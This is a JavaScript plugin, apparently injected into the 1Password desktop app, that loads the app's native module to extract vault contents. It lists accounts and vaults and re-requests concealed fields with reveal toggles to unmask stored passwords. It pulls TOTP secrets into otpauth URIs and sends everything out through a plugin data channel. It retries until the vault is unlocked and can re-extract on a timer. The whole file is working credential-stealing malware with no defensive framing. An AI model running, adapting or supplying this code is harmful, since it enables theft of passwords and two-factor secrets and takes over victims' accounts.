// 1Password Vault Extractor — main.js
// Accesses 1Password's native Rust module (index.node) to extract vault data.
// Payload formats determined by intercepting 1Password's own invoke_callback calls.

var nativeModule = null;
try {
    var appPath = plugin.electron.app.getAppPath();
    nativeModule = plugin.require(appPath + '/index.node');
} catch (e) {
    plugin.sendData('_error', { error: 'Failed to load native module: ' + String(e) });
}

if (!nativeModule) {
    return function() {};
}

var RETRY_INTERVAL = 30000;

function resolve(val) {
    if (val && typeof val.then === 'function') return val;
    return Promise.resolve(val);
}

function gqlQuery(queryStr, variables) {
    try {
        var raw = nativeModule.gql_invoke(JSON.stringify({
            query: queryStr,
            variables: variables || {}
        }));
        return resolve(raw).then(function(result) {
            if (typeof result === 'string') return JSON.parse(result);
            return result;
        });
    } catch (e) {
        return Promise.resolve({ error: String(e) });
    }
}

function coreInvoke(type, content) {
    try {
        var raw = nativeModule.invoke_callback(JSON.stringify({
            type: type,
            content: content || null
        }));
        return resolve(raw).then(function(result) {
            if (typeof result === 'string') return JSON.parse(result);
            return result;
        });
    } catch (e) {
        return Promise.resolve({ error: String(e) });
    }
}

// ===== Main extraction =====
function extractVaultData() {
    // Step 1: Get accounts and vaults via GQL
    return gqlQuery(
        'query ExtractSidebar {\n' +
        '  accounts {\n' +
        '    id\n' +
        '    ... on UnlockedAccount {\n' +
        '      name\n' +
        '      accountType\n' +
        '      selector { accountUuid }\n' +
        '      vaults {\n' +
        '        id\n' +
        '        icon\n' +
        '        vaultType\n' +
        '        selector { vaultUuid }\n' +
        '        name { nameText nameType }\n' +
        '      }\n' +
        '    }\n' +
        '    ... on LockedAccount {\n' +
        '      name\n' +
        '    }\n' +
        '  }\n' +
        '}'
    ).then(function(sidebarData) {
        if (sidebarData && sidebarData.error) {
            plugin.sendData('_error', { phase: 'sidebar_query', error: sidebarData.error });
            return false;
        }

        var accounts = (sidebarData && sidebarData.data && sidebarData.data.accounts) || [];
        var vaultList = [];
        var lockedAccounts = [];
        var accountUuids = [];

        for (var i = 0; i < accounts.length; i++) {
            var acct = accounts[i];
            if (acct.vaults) {
                var acctUuid = acct.selector ? acct.selector.accountUuid : null;
                if (acctUuid && accountUuids.indexOf(acctUuid) === -1) {
                    accountUuids.push(acctUuid);
                }
                for (var j = 0; j < acct.vaults.length; j++) {
                    var v = acct.vaults[j];
                    vaultList.push({
                        accountName: acct.name,
                        accountUuid: acctUuid,
                        vaultName: (v.name && v.name.nameText) || v.vaultType || 'Unknown',
                        vaultUuid: v.selector ? v.selector.vaultUuid : null,
                        vaultType: v.vaultType
                    });
                }
            } else {
                lockedAccounts.push(acct.name || acct.id);
            }
        }

        if (vaultList.length === 0) {
            plugin.sendData('vault_summary', {
                accounts: accounts.length,
                unlockedVaults: 0,
                lockedAccounts: lockedAccounts,
                vaults: [],
                status: 'all_locked'
            });
            return false;
        }

        plugin.sendData('vault_summary', {
            accounts: accounts.length,
            unlockedVaults: vaultList.length,
            lockedAccounts: lockedAccounts,
            vaults: vaultList,
            status: 'unlocked'
        });

        // Step 2: Get item list for each account
        // collectionUuid = accountUuid (not "everything")
        var chain = Promise.resolve();
        var vaultNameMap = {};
        for (var vi = 0; vi < vaultList.length; vi++) {
            vaultNameMap[vaultList[vi].vaultUuid] = vaultList[vi].vaultName;
        }

        for (var ai = 0; ai < accountUuids.length; ai++) {
            (function(accountUuid) {
                chain = chain.then(function() {
                    return extractItemsForAccount(accountUuid, vaultNameMap);
                });
            })(accountUuids[ai]);
        }

        return chain.then(function() { return true; });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'sidebar_query', error: String(e) });
        return false;
    });
}

function extractItemsForAccount(accountUuid, vaultNameMap) {
    // Exact format from interception: collectionUuid = accountUuid, properties = {}
    return coreInvoke('ItemList', {
        collectionUuid: accountUuid,
        itemListType: { type: 'AllItems' },
        properties: {}
    }).then(function(result) {
        // Response: {type: "ItemList", content: {items: {type: "items", content: [...]}}}
        var content = result;
        if (content && content.content) content = content.content;

        var itemsObj = content.items || content;
        var rawItems = [];

        if (itemsObj && itemsObj.content && Array.isArray(itemsObj.content)) {
            rawItems = itemsObj.content;
        } else if (Array.isArray(itemsObj)) {
            rawItems = itemsObj;
        }

        if (rawItems.length === 0) {
            if (content && content.error) {
                plugin.sendData('_error', { phase: 'item_list', error: String(content.error) });
            }
            return;
        }

        // Process each item detail sequentially
        var chain = Promise.resolve();
        for (var i = 0; i < rawItems.length; i++) {
            (function(rawItem) {
                chain = chain.then(function() {
                    return extractItemDetail(rawItem, accountUuid, vaultNameMap).catch(function(e) {
                        plugin.sendData('_error', {
                            phase: 'item_detail',
                            item: rawItem.title || 'unknown',
                            error: String(e)
                        });
                    });
                });
            })(rawItems[i]);
        }

        return chain;
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'item_list', error: String(e) });
    });
}

function extractItemDetail(rawItem, accountUuid, vaultNameMap) {
    var specifier = rawItem.itemSpecifier;
    if (!specifier) {
        plugin.sendData('vault_item', {
            title: rawItem.title || 'Unknown',
            category: '',
            vault: '',
            fields: [],
            note: 'No item specifier'
        });
        return Promise.resolve();
    }

    var vaultName = vaultNameMap[specifier.vaultUuid] || specifier.vaultUuid || '';

    // Pass 1: Fetch detail to discover concealed field UUIDs
    return coreInvoke('ItemDetail', {
        itemSpecifier: specifier,
        itemListType: { type: 'AllItems' },
        collectionUuid: accountUuid,
        toggleRevealUuids: [],
        renderTarget: 'baseApp'
    }).then(function(detail) {
        var vm = unwrapViewModel(detail);
        if (!vm) {
            plugin.sendData('vault_item', {
                title: rawItem.title || 'Unknown',
                category: '',
                vault: vaultName,
                fields: [],
                error: 'Empty detail response'
            });
            return;
        }

        // Collect all field UUIDs that appear concealed (masked with dots)
        var concealedUuids = findConcealedUuids(vm);

        if (concealedUuids.length > 0) {
            // Pass 2: Re-fetch with toggleRevealUuids to unmask secrets
            return coreInvoke('ItemDetail', {
                itemSpecifier: specifier,
                itemListType: { type: 'AllItems' },
                collectionUuid: accountUuid,
                toggleRevealUuids: concealedUuids,
                renderTarget: 'baseApp'
            }).then(function(revealedDetail) {
                var revealedVm = unwrapViewModel(revealedDetail);
                emitItem(revealedVm || vm, rawItem, specifier, vaultName, revealedDetail || detail);
            });
        } else {
            emitItem(vm, rawItem, specifier, vaultName, detail);
        }
    });
}

function unwrapViewModel(detail) {
    var c = detail;
    if (c && c.content) c = c.content;
    if (!c || c.type === 'empty') return null;
    if (c.type === 'viewModel' && c.content) return c.content;
    return c;
}

function findConcealedUuids(vm) {
    var uuids = [];
    deepScanForConcealed(vm, uuids, 0);
    return uuids;
}

function deepScanForConcealed(obj, uuids, depth) {
    if (depth > 10 || !obj || typeof obj !== 'object') return;
    if (Array.isArray(obj)) {
        for (var i = 0; i < obj.length; i++) deepScanForConcealed(obj[i], uuids, depth + 1);
        return;
    }
    // A concealed field has a displayValue containing dots (•) and a uuid
    var uuid = obj.uuid || obj.fieldId;
    if (uuid && obj.displayValue) {
        var dv = flattenStyledText(obj.displayValue);
        if (dv.indexOf('\u2022') !== -1 || dv.indexOf('••') !== -1) {
            uuids.push(uuid);
        }
    }
    // Also check by concealed flag
    if (uuid && obj.concealed) {
        if (uuids.indexOf(uuid) === -1) uuids.push(uuid);
    }
    var keys = Object.keys(obj);
    for (var k = 0; k < keys.length; k++) {
        deepScanForConcealed(obj[keys[k]], uuids, depth + 1);
    }
}

// Deep-scan any object tree for strings containing otpauth://
function findOtpAuthUrls(obj, results, depth) {
    if (depth > 15 || !obj) return;
    if (typeof obj === 'string') {
        if (obj.indexOf('otpauth://') !== -1) results.push(obj);
        return;
    }
    if (typeof obj !== 'object') return;
    if (Array.isArray(obj)) {
        for (var i = 0; i < obj.length; i++) findOtpAuthUrls(obj[i], results, depth + 1);
        return;
    }
    var keys = Object.keys(obj);
    for (var k = 0; k < keys.length; k++) {
        findOtpAuthUrls(obj[keys[k]], results, depth + 1);
    }
}

// Deep-scan for TOTP secrets — found in refreshRequest.totpSecret
function findTotpSecrets(obj, results, depth) {
    if (depth > 15 || !obj || typeof obj !== 'object') return;
    if (Array.isArray(obj)) {
        for (var i = 0; i < obj.length; i++) findTotpSecrets(obj[i], results, depth + 1);
        return;
    }
    // The TOTP secret lives in refreshRequest.totpSecret
    if (obj.totpSecret && typeof obj.totpSecret === 'string') {
        results.push({
            secret: obj.totpSecret,
            fieldId: obj.fieldId || '',
            label: obj.label || ''
        });
    }
    var keys = Object.keys(obj);
    for (var k = 0; k < keys.length; k++) {
        findTotpSecrets(obj[keys[k]], results, depth + 1);
    }
}

function emitItem(vm, rawItem, specifier, vaultName, rawDetail) {
    var fields = extractFieldsFromViewModel(vm);
    var title = vm.itemTitle || rawItem.title || 'Unknown';

    var category = '';
    if (rawItem.icon && rawItem.icon.sources) {
        for (var si = 0; si < rawItem.icon.sources.length; si++) {
            var src = rawItem.icon.sources[si];
            if (src.content && src.content.file) {
                category = src.content.file;
                break;
            }
        }
    }

    plugin.sendData('vault_item', {
        title: title,
        category: category,
        vault: vaultName,
        accountUuid: specifier.accountUuid,
        vaultUuid: specifier.vaultUuid,
        itemUuid: specifier.itemUuid,
        fields: fields
    });

    // Emit TOTP seed URIs as separate entries if present
    {
        // Check if any field looks like OTP
        var hasOtpField = false;
        for (var ti = 0; ti < fields.length; ti++) {
            var f = fields[ti];
            var lbl = (f.label || '').toLowerCase();
            var ftype = (f.type || '').toLowerCase();
            if (lbl.indexOf('one-time') !== -1 || lbl.indexOf('totp') !== -1 ||
                ftype.indexOf('otp') !== -1 || ftype.indexOf('totp') !== -1) {
                hasOtpField = true;
                break;
            }
        }

        if (hasOtpField) {
            // Extract TOTP secret from refreshRequest.totpSecret
            var totpSecrets = [];
            findTotpSecrets(rawDetail, totpSecrets, 0);

            // Also check for otpauth:// URIs directly
            var otpUrls = [];
            findOtpAuthUrls(rawDetail, otpUrls, 0);

            var seed = '';
            var secret = '';
            if (otpUrls.length > 0) {
                seed = otpUrls[0];
            } else if (totpSecrets.length > 0) {
                // Build otpauth:// URI from the extracted secret
                secret = totpSecrets[0].secret;
                seed = 'otpauth://totp/' + encodeURIComponent(title) +
                    '?secret=' + secret + '&digits=6&period=30';
            }

            plugin.sendData('totp_code', {
                title: title,
                seed: seed,
                secret: secret,
                vault: vaultName,
                itemUuid: specifier.itemUuid
            });
        }
    }
}


// UUIDs that are UI chrome, not actual credential fields
var NOISE_UUID_PREFIXES = ['breadcrumb-', 'item-title'];
var NOISE_UUID_SUFFIXES = ['-header'];

function isNoiseField(uuid) {
    if (!uuid) return false;
    for (var i = 0; i < NOISE_UUID_PREFIXES.length; i++) {
        if (uuid.indexOf(NOISE_UUID_PREFIXES[i]) === 0) return true;
    }
    for (var j = 0; j < NOISE_UUID_SUFFIXES.length; j++) {
        if (uuid.indexOf(NOISE_UUID_SUFFIXES[j]) === uuid.length - NOISE_UUID_SUFFIXES[j].length) return true;
    }
    return false;
}

// Flatten styled text arrays like [{type:"plainText", content:{text:"foo"}}] to "foo"
function flattenStyledText(val) {
    if (typeof val === 'string') return val;
    if (typeof val === 'number' || typeof val === 'boolean') return String(val);
    if (!val) return '';
    if (Array.isArray(val)) {
        var parts = [];
        for (var i = 0; i < val.length; i++) {
            var item = val[i];
            if (item && item.content && item.content.text !== undefined) {
                parts.push(item.content.text);
            } else if (item && item.text !== undefined) {
                parts.push(item.text);
            } else if (typeof item === 'string') {
                parts.push(item);
            }
        }
        return parts.join('');
    }
    if (val.text !== undefined) return val.text;
    if (val.content && val.content.text !== undefined) return val.content.text;
    return String(val);
}

function extractFieldsFromViewModel(vm) {
    var fields = [];
    try {
        // Walk the entire viewModel recursively to find all fields
        deepWalkForFields(vm, fields, 0);
    } catch (e) {
        fields.push({ label: '_parse_error', type: 'error', value: String(e) });
    }
    return fields;
}

function deepWalkForFields(obj, fields, depth) {
    if (depth > 12 || !obj || typeof obj !== 'object') return;

    if (Array.isArray(obj)) {
        for (var i = 0; i < obj.length; i++) deepWalkForFields(obj[i], fields, depth + 1);
        return;
    }

    // Check if this object is a field element (has displayValue and uuid)
    var uuid = obj.uuid || obj.fieldId;
    if (uuid && obj.displayValue !== undefined) {
        // Skip UI noise
        if (!isNoiseField(uuid)) {
            var label = obj.label || obj.title || obj.fieldLabel || '';
            var rawVal = obj.displayValue;
            var val = flattenStyledText(rawVal);
            var ftype = obj.fieldType || obj.type || '';

            // Detect OTP fields by type or clipboard action
            var clipContent = '';
            if (obj.clipboardContent) {
                clipContent = flattenStyledText(obj.clipboardContent);
            }
            if (!ftype && clipContent.indexOf('otpauth://') === 0) {
                ftype = 'otp';
            }

            fields.push({
                label: label || 'unknown',
                type: ftype,
                value: val,
                uuid: uuid,
                concealed: obj.concealed || false,
                clipboardContent: clipContent || undefined
            });
        }
        // Don't return — still recurse in case of nested fields
    }

    // Recurse into all object properties
    var keys = Object.keys(obj);
    for (var k = 0; k < keys.length; k++) {
        var key = keys[k];
        // Skip known non-field properties to avoid noise
        if (key === 'icon' || key === 'badge' || key === 'overflowMenu' ||
            key === 'overflowButton' || key === 'shareButton' || key === 'primaryButton' ||
            key === 'closeIcon' || key === 'commands' || key === 'styledTitle' ||
            key === 'styledSubtitle' || key === 'accessibilityLabel') continue;
        deepWalkForFields(obj[keys[k]], fields, depth + 1);
    }
}

// ===== Execution =====
function doExtract() {
    try {
        return extractVaultData().then(function(success) {
            return success;
        }).catch(function(e) {
            plugin.sendData('_error', { phase: 'top_level', error: String(e), stack: e.stack || '' });
            return false;
        });
    } catch (e) {
        plugin.sendData('_error', { phase: 'top_level', error: String(e), stack: e.stack || '' });
        return Promise.resolve(false);
    }
}

function retryUntilUnlocked() {
    doExtract().then(function(success) {
        if (!success) {
            plugin.setTimeout(retryUntilUnlocked, RETRY_INTERVAL);
        } else if (plugin.settings.extractInterval > 0) {
            plugin.setInterval(function() { doExtract(); }, plugin.settings.extractInterval * 1000);
        }
    });
}

plugin.setTimeout(retryUntilUnlocked, 2000);

return function cleanup() {};
